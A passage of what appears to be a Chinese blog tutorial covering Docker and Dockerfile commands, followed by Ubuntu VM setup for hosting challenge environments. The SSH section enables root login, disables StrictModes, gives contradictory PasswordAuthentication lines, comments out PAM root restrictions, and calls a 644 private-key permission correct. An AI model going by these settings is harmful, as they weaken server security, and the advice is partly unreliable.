java#从Docker Hub下载java最新版镜像。</span><br><span class="line">docker pull -a java#从Docker Hub下载REPOSITORY为java的所有镜像。</span><br><span class="line"></span><br><span class="line">docker pull [OPTIONS] NAME[:TAG|@DIGEST]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a :拉取所有 tagged 镜像</span><br><span class="line">--disable-content-trust :忽略镜像的校验,默认开启</span><br></pre></td></tr></table></figure><p><strong>docker push :</strong> 将本地的镜像上传到镜像仓库,要先登陆到镜像仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker push myapache:v1#上传本地镜像myapache:v1到镜像仓库中。</span><br><span class="line"></span><br><span class="line">docker push [OPTIONS] NAME[:TAG]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">--disable-content-trust :忽略镜像的校验,默认开启</span><br></pre></td></tr></table></figure><h3 id="本地镜像管理"><a href="#本地镜像管理" class="headerlink" title="本地镜像管理"></a>本地镜像管理</h3><p><strong>docker images :</strong> 列出本地镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">docker build -t 镜像名 .   #(dockerfile在统一目录，&#x27;.&#x27;表示当前目录即Dockerfile文件所在的目录)创建镜像</span><br><span class="line">docker build -t test:v1 .  #test:v1为tagname，&#x27;.&#x27;表示当前目录即Dockerfile文件所在的目录</span><br><span class="line"></span><br><span class="line">docker build [OPTIONS] PATH | URL | -</span><br><span class="line">OPTIONS说明：</span><br><span class="line">--tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。</span><br><span class="line">-f :指定要使用的Dockerfile路径；</span><br><span class="line">--build-arg=[] :设置镜像创建时的变量；</span><br><span class="line">--cpu-shares :设置 cpu 使用权重；</span><br><span class="line">--cpu-period :限制 CPU CFS周期；</span><br><span class="line">--cpu-quota :限制 CPU CFS配额；</span><br><span class="line">--cpuset-cpus :指定使用的CPU id；</span><br><span class="line">--cpuset-mems :指定使用的内存 id；</span><br><span class="line">--disable-content-trust :忽略校验，默认开启；</span><br><span class="line">--force-rm :设置镜像过程中删除中间容器；</span><br><span class="line">--isolation :使用容器隔离技术；</span><br><span class="line">--label=[] :设置镜像使用的元数据；</span><br><span class="line">-m :设置内存最大值；</span><br><span class="line">--memory-swap :设置Swap的最大值为内存+swap，&quot;-1&quot;表示不限swap；</span><br><span class="line">--no-cache :创建镜像的过程不使用缓存；</span><br><span class="line">--pull :尝试去更新镜像的新版本；</span><br><span class="line">--quiet, -q :安静模式，成功后只输出镜像 ID；</span><br><span class="line">--rm :设置镜像成功后删除中间容器；</span><br><span class="line">--shm-size :设置/dev/shm的大小，默认值是64M；</span><br><span class="line">--ulimit :Ulimit配置。</span><br><span class="line">--squash :将 Dockerfile 中所有的操作压缩为一层。</span><br><span class="line">--network: 默认 default。在构建期间设置RUN指令的网络模式</span><br></pre></td></tr></table></figure><p><strong>docker images :</strong> 列出本地镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker images#查看本地镜像列表。</span><br><span class="line">docker images  ubuntu#列出本地镜像中REPOSITORY为ubuntu的镜像列表。</span><br><span class="line"></span><br><span class="line">docker images [OPTIONS] [REPOSITORY[:TAG]]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-a :列出本地所有的镜像（含中间映像层，默认情况下，过滤掉中间映像层）；</span><br><span class="line">--digests :显示镜像的摘要信息；</span><br><span class="line">-f :显示满足条件的镜像；</span><br><span class="line">--format :指定返回值的模板文件；</span><br><span class="line">--no-trunc :显示完整的镜像信息；</span><br><span class="line">-q :只显示镜像ID。</span><br></pre></td></tr></table></figure><p><strong>docker rmi :</strong> 删除本地一个或多个镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f runoob/ubuntu:v4#强制删除本地镜像 runoob/ubuntu:v4。</span><br><span class="line"></span><br><span class="line">docker rmi [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-f :强制删除；</span><br><span class="line">--no-prune :不移除该镜像的过程镜像，默认移除；</span><br></pre></td></tr></table></figure><p><strong>docker tag :</strong> 标记本地镜像，将其归入某一仓库。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker tag ubuntu:15.10 runoob/ubuntu:v3 #将镜像ubuntu:15.10标记为 runoob/ubuntu:v3 镜像。</span><br><span class="line"></span><br><span class="line">docker tag [OPTIONS] IMAGE[:TAG] [REGISTRYHOST/][USERNAME/]NAME[:TAG]</span><br></pre></td></tr></table></figure><p><strong>docker history :</strong> 查看指定镜像的创建历史。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker history runoob/ubuntu:v3#查看本地镜像runoob/ubuntu:v3的创建历史。</span><br><span class="line"></span><br><span class="line">docker history [OPTIONS] IMAGE</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-H :以可读的格式打印镜像大小和日期，默认为true；</span><br><span class="line">--no-trunc :显示完整的提交记录；</span><br><span class="line">-q :仅列出提交记录ID。</span><br></pre></td></tr></table></figure><p><strong>docker save :</strong> 将指定镜像保存成 tar 归档文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker save -o my_ubuntu_v3.tar runoob/ubuntu:v3#将镜像 runoob/ubuntu:v3 生成 my_ubuntu_v3.tar 文档</span><br><span class="line"></span><br><span class="line">docker save [OPTIONS] IMAGE [IMAGE...]</span><br><span class="line">OPTIONS 说明：</span><br><span class="line">-o :输出到的文件。</span><br></pre></td></tr></table></figure><p><strong>docker load :</strong> 导入使用 [docker save]命令导出的镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker load &lt; busybox.tar.gz#导入镜像：</span><br><span class="line">docker load -i name.tar   #导入name.tar</span><br><span class="line"></span><br><span class="line">docker load [OPTIONS]</span><br><span class="line">OPTIONS 说明：</span><br><span class="line">--input , -i : 指定导入的文件，代替 STDIN。</span><br><span class="line">--quiet , -q : 精简输出信息。</span><br></pre></td></tr></table></figure><p><strong>docker import :</strong> 从归档文件中创建镜像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker import  ubuntu_v3.tar runoob/ubuntu:v4  #从镜像归档文件ubuntu_v3.tar创建镜像，命名为runoob/ubuntu:v4</span><br><span class="line"></span><br><span class="line">docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span><br><span class="line">OPTIONS说明：</span><br><span class="line">-c :应用docker 指令创建镜像；</span><br><span class="line">-m :提交时的说明文字；</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>docker save 保存的是镜像（image），docker export 保存的是容器（container）；</li><li>docker load 用来载入镜像包，docker import 用来载入容器包，但两者都会恢复为镜像；</li><li>docker load 不能对载入的镜像重命名，而 docker import 可以为镜像指定新名称。</li></ul><p>常用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">docker info #显示 Docker 系统信息，包括镜像和容器数。。</span><br><span class="line">docker version #显示 Docker 版本信息。</span><br><span class="line">docker cp 本地文件 容器ID:路径   #本地文件复制到容器里面</span><br><span class="line">docker search [keywords] #搜寻与keywords相关的镜像</span><br><span class="line">docker images  #查看本地的image镜像</span><br><span class="line">docker pull [image] #拉取镜像</span><br><span class="line">docker run -d -p [host port]:[docker port] [image] #新建一个docker容器，并映射端口号</span><br><span class="line">docker ps#查看所有正在运行的docker容器</span><br><span class="line">docker ps -a #查看所有的docker容器</span><br><span class="line">docker exec -it [container id] bash #进入一个docker容器</span><br><span class="line">docker cp [本地路径] [container id]:[container 路径] #拷贝本地文件到docker</span><br><span class="line">docker start [container id] #启动一个docker容器</span><br><span class="line">docker stop [container id] #停止一个docker容器</span><br><span class="line">docker restart [container id] #重启启一个docker容器</span><br><span class="line">docker rmi $(docker images -q -f dangling=true)#删除所有未打 dangling 标签的镜像</span><br><span class="line">docker rm [container id] #删除一个docker容器(需要先停止容器才能删除容器)</span><br><span class="line">docker rmi [image id] #删除一个docker镜像(需要删除镜像对应的容器才能删除镜像)</span><br><span class="line">docker rm $(docker ps -a -q)#删除所有已经停止的容器</span><br><span class="line">docker rmi $(docker images -q)  #删除所有没有使用的镜像 </span><br><span class="line">docker kill $(docker ps -a -q)#杀死所有正在运行的容器</span><br><span class="line">docker rmi imagesid删除镜像id #通过镜像的id来删除指定镜像</span><br><span class="line">docker load -i name.tar #导入镜像</span><br><span class="line">docker save -o name.tar imageID或image_name #导出镜像，注意imageID名导出默认tag信息为none，推荐image_name </span><br><span class="line"></span><br><span class="line">docker tag (imageid) test:latest#重命名,imageid的镜像的tag为test:latest</span><br><span class="line">然后会发现有两个imageid一样的镜像，可以删除老的镜像 </span><br><span class="line">docker rmi old_imagename(这里不能使用imageid删除，因为二者id一致)  -f强制删除</span><br><span class="line"></span><br><span class="line">docker-compose up -d#使用docker-compose启动容器</span><br><span class="line">docker-compose exec activemq bash#进入容器</span><br></pre></td></tr></table></figure><ul><li>不常用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker system df#查看docker磁盘使用情况</span><br><span class="line">docker system prune#清理磁盘，删除关闭的容器、无用的数据卷和网络，以及 dangling 镜像（即无 tag 的镜像</span><br><span class="line">docker system prune -a#命令清理，该命令清理得更加彻底，可以将没有容器使用 Docker 镜像都删掉。</span><br><span class="line">docker volume ls   #查看volume</span><br><span class="line">docker volume rm $(docker volume ls -q)  #批量删除所有的孤儿 volume（即没有任何容器用到的 volume）</span><br></pre></td></tr></table></figure><h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>我们可以把构建一道题目的过程分为以下具体三步。</p><ol><li>指定具体要使用的镜像</li><li>启动镜像，构建一个容器</li><li>移入相关的源码，构建容器里面的环境配置<br>在上面的实例中，我们第三步里面需要进行的操作只有把源码移入/var/www/html文件夹里面而已，但如果环境配置较为复杂，比如需要构建数据库，安装各种插件等，第三步需要的时间就太长了。如果我们改变下上面的步骤。变成：</li><li>指定使用的镜像</li><li>配置相关的环境，移入相关的代码</li><li>根据第二步的内容，把这些操作以类似于代码，程序的模式写入一个模板，让Docker根据这个模板来生成新的镜像</li><li>根据这个新的镜像来生成新的容器<br>如果是这么操作的话，带来的好处就是可以方便的构造出一个针对性的镜像。配置题目的时候，我们只需要根据这个我们创作的模板生成特制的镜像，直接按照这个镜像就可以直接生成环境了。这个需要的模板就是<code>Dockerfile</code>。<br><code>Dockerfile</code>是一个包含用于组合映像的命令的文本文档。可以使用在命令行中调用任何命令。 Docker通过读取<code>Dockerfile</code>中的指令自动生成映像。<br><code>docker build</code>命令用于从Dockerfile构建映像。可以在<code>docker build</code>命令中使用-f标志指向文件系统中任何位置的<code>Dockerfile</code>。<br><code>Dockerfile</code> 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令，<code>#</code> 为 Dockerfile 中的注释。<br>Docker以从上到下的顺序运行<code>Dockerfile</code>的指令。为了指定基本映像，第一条指令必须是<code>FROM</code>。一个声明以＃字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</li></ol><p><strong>常用指令</strong><br>FROM： 指定基础镜像，必须为第一个命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FROM &lt;image&gt;</span><br><span class="line">FROM &lt;image&gt;:&lt;tag&gt;</span><br><span class="line">FROM &lt;image&gt;@&lt;digest&gt;</span><br><span class="line">例：</span><br><span class="line">  FROM php:5.6</span><br><span class="line">tag或digest是可选的，如果不使用这两个值时，会使用latest版本的基础镜像</span><br></pre></td></tr></table></figure><p>MAINTAINER: 维护者信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MAINTAINER &lt;name&gt;</span><br><span class="line"></span><br><span class="line">例：</span><br><span class="line">    MAINTAINER zhangsan</span><br><span class="line">MAINTAINER 123@163.com</span><br></pre></td></tr></table></figure><p>RUN: 构建镜像时执行的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RUN用于在镜像容器中执行命令，其有以下两种命令执行方式：</span><br><span class="line">shell执行</span><br><span class="line">RUN &lt;command&gt;</span><br><span class="line">exec执行</span><br><span class="line">RUN [&quot;executable&quot;, &quot;paraml&quot;, &quot;param2&quot;]</span><br><span class="line">RUN指令创建的中间镜像会被缓存，并会在下次构建中使用。如果不想使用这些缓存镜像，可以在构建时指定--no-cache参数，如：docker build --no-cache</span><br></pre></td></tr></table></figure><p>ADD: 将本地文件添加到容器中，tar类型文件会自动解压（网络压缩资源不会被解压），可以访问网络资源，类似wget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ADD &lt;src&gt; ... &lt;dest&gt;</span><br><span class="line">ADD [&quot;&lt;src&gt;&quot;, ... &quot;&lt;dest&gt;&quot;] 用于支持包含空格的路径</span><br><span class="line">例：</span><br><span class="line">ADD hom* /mydir/  # 添加所有以 hom 开头的文件</span><br><span class="line">ADD hom?.txt /mydir/  # ?替代一个单字符，例如，home.txt</span><br><span class="line">ADD test mydir/  # 添加test到mydir</span><br></pre></td></tr></table></figure><p>COPY: 功能类似ADD，但是不会自动解压文件，也不能访问网络资源<br>CMD: 构建容器后调用，也就是在容器启动时才进行调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;] # 执行可执行文件，优先</span><br><span class="line">CMD [&quot;param1&quot;,&quot;param2&quot;]  # 设置了ENTRYPOINT，则直接调用ENTRYPOINT添加参数</span><br><span class="line">CMD command param1 param2  # 执行shell内部命令</span><br><span class="line"></span><br><span class="line">CMD echo &quot;This is a test.&quot; | wc -</span><br><span class="line">CMD [&quot;/usr/bin/wc&quot;,&quot;--help&quot;]</span><br><span class="line"></span><br><span class="line">CMD不同于RUN，CMD用于指定在容器启动时所要执行的命令，而RUN用于指定镜像构建时所要执行的命令。</span><br></pre></td></tr></table></figure><p>ENTRYPOINT: 配置容器，使其可执行化。配合CMD可省去 application，只使用参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT [&quot;executable&quot;,&quot;param1&quot;,&quot;param2&quot;]  # 可执行文件，优先</span><br><span class="line">ENTRYPOINT command param1 param2  # shell内部命令</span><br><span class="line">ENTRYPOINT与CMD非常类似，不同的是通过docker run执行的命令不会覆盖ENTRYPOINT，而docker run命令中指定的任何参数，都会被当做参数再次传递给ENTRYPOINT。Dockerfile中只允许有一个ENTRYPOINT命令，多指定时会覆盖前面的设置，而只执行最后的ENTRYPOINT指令。</span><br></pre></td></tr></table></figure><p>LABEL: 用于为镜像添加元数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LABEL &lt;key&gt;=&lt;value&gt; &lt;key&gt;=&lt;value&gt; ...</span><br><span class="line">LABEL version=&quot;1.0&quot; description=&quot;this is a test&quot; by=&quot;ca5tle&quot;</span><br><span class="line">使用LABEL指定元数据时，一条LABEL指定可以指定一或多条元数据，指定多条元数据时不同元数据之间通过空格分隔。推荐所有的元数据通过一条LABEL指令指定，以免生成过多的中间镜像。</span><br></pre></td></tr></table></figure><p>ENV: 设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENV &lt;key&gt; &lt;value&gt;  # &lt;key&gt;之后的所有内容均会被视为其&lt;value&gt;的组成部分，因此一次只能设置一个变量</span><br><span class="line">ENV &lt;key&gt;=&lt;value&gt; ... # 可以设置多个变量，每个变量为一个&lt;key&gt;=&lt;value&gt;的键值对，如果&lt;key&gt;中包含空格，可以使用 \ 来进行转义，也可以用&quot;&quot;表示，另外 \ 也可以用于续行</span><br></pre></td></tr></table></figure><p>EXPOSE: 指定外界交互的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPOSE &lt;port&gt; [&lt;port&gt;...]</span><br><span class="line"></span><br><span class="line">EXPOSE并不会让容器的端口访问到主机。要使其可访问，需要在docker run运行容器时通过-p来映射端口</span><br></pre></td></tr></table></figure><p>VOLUME: 用于指定持久化目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VOLUME [&quot;/path/to/dir&quot;]</span><br><span class="line">一个卷可以存在于一个或多个容器的指定目录，该目录可以绕过联合文件系统，并具有以下功能：</span><br><span class="line">1. 卷可以容器间共享和重用</span><br><span class="line">2. 容器并不一定要和其他容器共享卷</span><br><span class="line">3. 修改卷后会立即生效</span><br><span class="line">4. 对卷的修改不会对镜像产生影响</span><br><span class="line">5. 卷会一直存在，直到没有任何容器在使用它</span><br></pre></td></tr></table></figure><p>USER: 指定运行容器时的用户名或UID，后续的RUN也会使用指定用户。使用USER指定用户时，可以使用用户名、UID或GID，或者是两者组合。当服务不需要管理员权限时，可以通过该命令指定运行用户。并且可以在之前创建所需要的用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">USER user</span><br><span class="line">USER user:group</span><br><span class="line">USER uidU</span><br><span class="line">SER uid:gid</span><br><span class="line">USER user:gid</span><br><span class="line">USER uid:group</span><br><span class="line">使用USER指定用户后，Dockerfile中其后的命令RUN、CMD、ENTRYPOINT都将使用该用户。镜像构建完成后，通过docker run运行容器时，可以通过-u参数来覆盖所指定的用户。</span><br></pre></td></tr></table></figure><p>ARG: 用于指定传递给构建运行时的变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARG &lt;name&gt;</span><br></pre></td></tr></table></figure><p>ONBUILD: 用于设置镜像触发器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ONBUILD [INSTRUCTION]</span><br><span class="line">例：</span><br><span class="line">ONBUILD ADD . /app/src</span><br><span class="line">当所构建的镜像被用做其它镜像的基础镜像，该镜像中的触发器将会被钥触发</span><br></pre></td></tr></table></figure><h1 id="基础虚拟机配置"><a href="#基础虚拟机配置" class="headerlink" title="基础虚拟机配置"></a>基础虚拟机配置</h1><h2 id="准备事项"><a href="#准备事项" class="headerlink" title="准备事项"></a>准备事项</h2><h3 id="桥接连不上网"><a href="#桥接连不上网" class="headerlink" title="桥接连不上网"></a>桥接连不上网</h3><p>VM机制，跟平台没关系，暂时不处理</p><h3 id="创建root用户密码"><a href="#创建root用户密码" class="headerlink" title="创建root用户密码"></a>创建root用户密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo su root</span><br><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line">chattr -i /etc/passwd</span><br><span class="line">passwd: Authentication token manipulation error</span><br></pre></td></tr></table></figure><p>两次密码输入之后能够看到success，修改gedit /etc/ssh/sshd_config配置文件允许root登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 免密码登录</span><br><span class="line">StrictModes no</span><br><span class="line"># 开启rsa验证</span><br><span class="line">RSAAuthentication yes</span><br><span class="line"># 是否使用公钥</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line"># 公钥保存位置</span><br><span class="line">AuthorizedKeysFile    /root/.ssh/authorized_keys</span><br><span class="line"># 禁止使用密码登录</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"># 默认是不允许root远程登录的</span><br><span class="line">PermitRootLogin yes</span><br><span class="line"># 默认不允许ssh密码验证</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><h3 id="使用root登录"><a href="#使用root登录" class="headerlink" title="使用root登录"></a>使用root登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /root/.profile</span><br><span class="line">或者gedit /root/.profile</span><br></pre></td></tr></table></figure><p>修改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tty -s &amp;&amp; mesg n || true</span><br><span class="line">#mesg n || true</span><br></pre></td></tr></table></figure><p>修改登录权限，修改 gdm-autologin 和 gdm-password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pam.d/gdm-autologin </span><br><span class="line">注释掉auth    required        pam_succeed_if.so user != root quiet_success</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pam.d/gdm-password </span><br><span class="line">注释掉auth   required        pam_succeed_if.so user != root quiet_success</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf </span><br><span class="line">添加</span><br><span class="line">greeter-show-manual-login=true</span><br><span class="line">all-guest=false</span><br></pre></td></tr></table></figure><p>重启生效</p><h3 id="安装ssh"><a href="#安装ssh" class="headerlink" title="安装ssh"></a>安装ssh</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install openssh-server</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/etc/init.d/ssh start</span><br><span class="line">/etc/init.d/ssh status</span><br><span class="line">ps -e | grep sshd</span><br><span class="line">前面需要结合root做配置</span><br></pre></td></tr></table></figure><h3 id="配置ssh私钥"><a href="#配置ssh私钥" class="headerlink" title="配置ssh私钥"></a>配置ssh私钥</h3><p>生成私钥ssh-keygen</p><p>可以指定文件位置，会有两个文件id_rsa和id_rsa.pub，其中id_rsa可以远程连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /root/.ssh/id_rsa.pub &gt; /root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><p>需要结合前面的root配置进行ssh登录</p><p>私钥权限644</p><h3 id="VMware-tools"><a href="#VMware-tools" class="headerlink" title="VMware tools"></a>VMware tools</h3><p>vm里面安装即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./vmware-install.pl</span><br></pre></td></tr></table></figure><p>第一个按yes其他已知回车就好了，不能复制粘贴的话需要安装下面的东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo su //进入管理员模式</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install open-vm-tools open-vm-tools-desktop</span><br><span class="line">vmware-user //开启服务,可以不用重启</span><br><span class="line"></span><br><span class="line">vmtools无法复制</span><br><span class="line">sudo apt-get install open-vm-tools-desktop fuse</span><br></pre></td></tr></table></figure><p>参考连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_43206665/article/details/123215855</span><br></pre></td></tr></table></figure><h3 id="修改主机名"><a href="#修改主机名" class="headerlink" title="修改主机名"></a>修改主机名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostnamectl    #可以查看主机上的一些信息</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hostname#修改</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reboot#重启生效</span><br></pre></td></tr></table></figure><h3 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>配置文件换成阿里源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line">deb-src 